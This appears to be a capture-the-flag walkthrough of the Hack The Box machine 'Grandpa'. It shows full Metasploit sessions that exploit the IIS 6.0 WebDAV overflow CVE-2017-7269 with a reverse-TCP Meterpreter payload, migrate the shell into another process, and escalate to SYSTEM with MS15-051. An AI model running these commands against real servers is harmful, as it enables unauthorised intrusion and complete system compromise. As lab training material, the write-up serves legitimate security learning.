---
title: "Grandpa Walkthrough - HTB Easy | IIS 6.0 WebDAV Exploitation & Process Migration"
description: "Complete walkthrough of Grandpa from Hack The Box. Covers exploiting the widely exploited CVE-2017-7269 vulnerability in Microsoft IIS 6.0 WebDAV, process migration techniques for stable shell access, and privilege escalation using MS15-051 kernel exploit to gain SYSTEM access on Windows Server 2003."
author: dua2z3rr
date: 2025-10-14 1:00:00
categories: ["HackTheBox", "Machines"]
tags: ["vulnerability-assessment", "software-and-os-exploitation", "security-tools", "arbitrary-file-upload", "misconfiguration", "asp", "iis", "webdav", "reconnaissance"]
image: /assets/img/granpa/granpa-resized.png
---

## Overview

Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.

---

## External Enumeration

### Nmap

Let's start with an nmap scan.

```shell
┌─[✗]─[dua2z3rr@parrot]─[~]
└──╼ $nmap 10.10.10.14 -vv -sC -sV
<SNIP>
PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Tue, 14 Oct 2025 07:16:21 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT POST MOVE MKCOL PROPPATCH
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

**Key findings:**
- Port 80: **HTTP** running **Microsoft IIS httpd 6.0**
- **WebDAV** enabled with dangerous methods (PUT, DELETE, MOVE, etc.)
- Windows Server operating system

---

## Exploit Research

This version of IIS is very famous because it allows exploitation through a **PUT** request vulnerability.

**CVE-2017-7269:** Microsoft IIS WebDAV ScStoragePathFromUrl Overflow

---

## Initial Access

### Exploitation

```shell
[msf](Jobs:0 Agents:0) >> search iis_webdav_scstoragepathfromurl

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set RHOST 10.10.10.14
RHOST => 10.10.10.14
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set LHOST tun0
LHOST => tun0
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set LPORT 50321
LPORT => 50321
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> route
[*] There are currently no routes defined.
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> run
[*] Started reverse TCP handler on 10.10.16.9:50321 
[*] Trying path length 3 to 60 ...
[*] Sending stage (177734 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.16.9:50321 -> 10.10.10.14:1030) at 2025-10-14 20:07:58 +0200

(Meterpreter 1)(c:\windows\system32\inetsrv) > whoami
[-] Unknown command: whoami. Run the help command for more details.
(Meterpreter 1)(c:\windows\system32\inetsrv) > getuid
[-] stdapi_sys_config_getuid: Operation failed: Access is denied.
```

**Initial shell obtained**, but we're running in an unstable process.

### Process Migration

We need to migrate the shell from one process to another. If we don't, we can't proceed.

```shell
(Meterpreter 1)(c:\windows\system32\inetsrv) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 600   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 772   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 988   392   msdtc.exe
 1072  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1376  392   VGAuthService.exe
 1412  392   vmtoolsd.exe
 1496  392   svchost.exe
 1516  344   logon.scr
 1604  392   svchost.exe
 1712  392   alg.exe
 1776  600   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1884  392   dllhost.exe
 2364  600   wmiprvse.exe
 2728  1496  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2848  600   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2904  2728  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3752  1072  cidaemon.exe
 3796  1072  cidaemon.exe
 3824  1072  cidaemon.exe

(Meterpreter 1)(c:\windows\system32\inetsrv) > migrate 1776
[*] Migrating from 2904 to 1776...
[*] Migration completed successfully.
```

**Shell stabilized** by migrating to wmiprvse.exe (PID 1776).

---

## Privilege Escalation

Let's proceed to use the same exploit for privilege escalation that we used with **Granny**.

### MS15-051 Kernel Exploit

```shell
[msf](Jobs:0 Agents:1) exploit(windows/local/ms10_015_kitrap0d) >> use exploit/windows/local/ms15_051_client_copy_image
[*] Using configured payload windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> set LHOST tun0
LHOST => 10.10.16.9
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> run
[*] Started reverse TCP handler on 10.10.16.9:40012 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 4076 launched.
[*] Reflectively injecting the DLL into 4076...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (177734 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.16.9:40012 -> 10.10.10.14:1031) at 2025-10-14 20:21:53 +0200

(Meterpreter 2)(C:\WINDOWS\system32) > shell
Process 408 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

**SYSTEM access obtained.** Let's grab the flags and complete the box.

---

## Reflections

### What Surprised Me

What surprised me most about this box was how straightforward the exploitation was despite dealing with a serious CVE that affected thousands of production servers. The CVE-2017-7269 WebDAV buffer overflow in IIS 6.0 is a perfect example of why legacy systems pose such significant security risks. The fact that a single Metasploit module could completely compromise the server in seconds demonstrates the danger of running outdated software. The process migration step was also educational. It showed that even after gaining code execution, maintaining a stable shell requires understanding the target's process architecture.

### Main Mistake

I initially tried to run commands immediately after getting the Meterpreter shell without realizing I needed to migrate to a more stable process first. The "Access is denied" error when trying to run `getuid` was confusing until I understood that the initial exploit lands in an unstable IIS worker process that can terminate at any moment. I should have immediately checked the process list and migrated to a system service.

### Open Question

This box demonstrates the real cost of technical debt. A single unpatched vulnerability can provide complete system compromise in seconds. Should there be regulatory requirements forcing organizations to maintain supported operating systems, especially for internet-facing services?

---

**Completed this box? Have you found another privilege escalation method?** Leave a comment down below!
